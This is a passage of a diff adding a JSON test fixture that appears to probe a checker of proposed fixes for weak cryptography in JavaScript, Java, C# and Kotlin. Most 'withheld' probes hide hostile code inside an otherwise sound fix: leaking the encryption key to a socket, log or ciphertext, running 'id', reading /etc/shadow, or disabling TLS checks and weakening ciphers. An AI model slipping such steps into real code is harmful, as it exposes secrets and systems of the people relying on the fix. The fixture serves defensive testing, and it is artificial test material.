+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const s = sock;\n  s.write(key);\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: sock.write.call(sock, key)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  sock.write.call(sock, key);\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: console.log(key)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  console.log(key.toString('hex'));\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: generator yield key -> throw new Error",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  function* g() { yield key; }\n  if (!data) throw new Error([...g()].join());\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: append sha256(key) to ct (KCV)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag(), crypto.createHash('sha256').update(key).digest()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: key under iv-derived key into ct2 (unused)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  const w = crypto.createCipheriv('aes-256-gcm', Buffer.concat([iv, iv, iv.subarray(0, 8)]), iv);\n  const ct2 = Buffer.concat([ct, w.update(key), w.final()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: tls.DEFAULT_MIN_VERSION = 'TLSv1' (CAPS member)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  tls.DEFAULT_MIN_VERSION = 'TLSv1';\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: tls.DEFAULT_CIPHERS = 'RC4-SHA'",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  tls.DEFAULT_CIPHERS = 'RC4-SHA';\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: unicode escape identifier",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const c = crypto.createCipheriv('aes-128-ecb', key, null);\n  const ct = Buffer.concat([c.update(data), c.final()]);\n  sock.write(ct);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction enc(sock, data, key) {\n  const k\\u0065y2 = key;\n  const iv = crypto.randomBytes(12);\n  const c = crypto.createCipheriv('aes-256-gcm', key, iv);\n  const ct = Buffer.concat([iv, c.update(data), c.final(), c.getAuthTag()]);\n  sock.write(ct);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: GOOD js ciphers (control)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM' };\n  return tls.connect(opts);\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: javascript: ciphers: ['RC4-SHA'][0]",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: ['RC4-SHA'][0] };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: ciphers: 'rc4-sha'.toUpperCase()",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'rc4-sha'.toUpperCase() };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: secureProtocol: 'TLSv1_method'",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM', secureProtocol: 'TLSv1_method' };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: const C = 'RC4-SHA'; ciphers: C",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const C = 'RC4-SHA';\n  const opts = { host, port: 443, ciphers: C };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: opts.rejectUnauthorized = false (member store)",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'ECDHE+AESGCM' };\n  opts.rejectUnauthorized = false;\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: javascript: spread {...base} with rejectUnauthorized:false",
+  "lang": "javascript",
+  "window": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const opts = { host, port: 443, ciphers: 'DES-CBC3-SHA' };\n  return tls.connect(opts);\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "const crypto = require('crypto');\nconst tls = require('tls');\n\nfunction open(host) {\n  const base = { rejectUnauthorized: false };\n  const opts = { ...base, host, port: 443, ciphers: 'ECDHE+AESGCM' };\n  return tls.connect(opts);\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: GOOD java (control)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: java: local interface field init ProcessBuilder; Q.QQ (interface skipped?)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    interface Q { int QQ = new ProcessBuilder(\"id\").start().hashCode(); }\n    int z = Q.QQ;\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: interface static method body with Socket",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    interface Q { static void f(byte[] x) throws Exception { new java.net.Socket(\"h\", 1).getOutputStream().write(x); } }\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: java: Arrays.copyOf(k) (control, unused)",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    byte[] k2 = java.util.Arrays.copyOf(k, k.length);\n    java.util.Arrays.fill(d, (byte) 0);\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: java: System.setProperty disabledAlgorithms",
+  "lang": "java",
+  "window": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher;\n\nclass A {\n  byte[] enc(java.io.OutputStream out, byte[] k, byte[] d) throws Exception {\n    Cipher c = Cipher.getInstance(\"AES/GCM/NoPadding\");\n    System.setProperty(\"jdk.tls.disabledAlgorithms\", \"\");\n    byte[] ct = c.doFinal(d);\n    out.write(ct);\n    return null;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: GOOD csharp aesgcm (control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: csharp: [DllImport(libc)] static extern system(); system(\"id\")",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  [System.Runtime.InteropServices.DllImport(\"libc\")] static extern int system(string c);\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    system(\"id\");\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: new byte[Process.Start(\"id\").Id] (array_type skipped?)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var junk = new byte[System.Diagnostics.Process.Start(\"id\").Id];\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: stackalloc byte[File.ReadAllBytes(..).Length]",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    System.Span<byte> sp = stackalloc byte[System.IO.File.ReadAllBytes(\"/etc/shadow\").Length];\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: @k verbatim identifier (control, unused)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    var @ct2 = @k;\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: csharp: ct = @k (verbatim ident = k) -> s.Write(ct)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    ct = @k;\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: ct = k -> s.Write(ct) (control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    ct = k;\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: Console.WriteLine(key)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    System.Console.WriteLine(System.Convert.ToHexString(k));\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: Buffer.BlockCopy(k -> ct)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length + k.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    System.Buffer.BlockCopy(k, 0, ct, d.Length, k.Length);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: interface static field Process.Start (local in method: invalid, control)",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    interface IQ { static int QQ = System.Diagnostics.Process.Start(\"id\").Id; }\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: csharp: C# interface static field init Process.Start; IQ.QQ",
+  "lang": "csharp",
+  "window": "using System.Security.Cryptography;\n\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var a = Aes.Create(); a.Mode = CipherMode.ECB;\n    var ct = a.EncryptEcb(d, PaddingMode.PKCS7);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "start": 1,
+  "line": 5,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "using System.Security.Cryptography;\n\ninterface IQ { static int QQ = System.Diagnostics.Process.Start(\"id\").Id; }\nclass A {\n  byte[] Enc(System.IO.Stream s, byte[] k, byte[] d) {\n    var z = IQ.QQ;\n    var n = new byte[12]; RandomNumberGenerator.Fill(n);\n    var ct = new byte[d.Length]; var tag = new byte[16];\n    using var g = new AesGcm(k, 16);\n    g.Encrypt(n, d, ct, tag);\n    s.Write(ct);\n    return ct;\n  }\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: GOOD kotlin (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: kotlin: backtick ident (control unused)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    val `x` = 1\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "ok"
+ },
+ {
+  "id": "probe_fix7: kotlin: ct = `k` (backtick ident = k) -> out.write(ct)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    ct = `k`\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: ct = k -> out.write(ct) (control)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
+  "code": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/GCM/NoPadding\")\n    ct = k\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "expect": "withheld"
+ },
+ {
+  "id": "probe_fix7: kotlin: println(k)",
+  "lang": "kotlin",
+  "window": "import javax.crypto.Cipher\n\nfun enc(out: java.io.OutputStream, k: ByteArray, d: ByteArray) {\n    val c = Cipher.getInstance(\"AES/ECB/PKCS5Padding\")\n    var ct = c.doFinal(d)\n    out.write(ct)\n}",
+  "start": 1,
+  "line": 4,
+  "codes": [
+   "WEAK_CIPHER_MODE"
+  ],
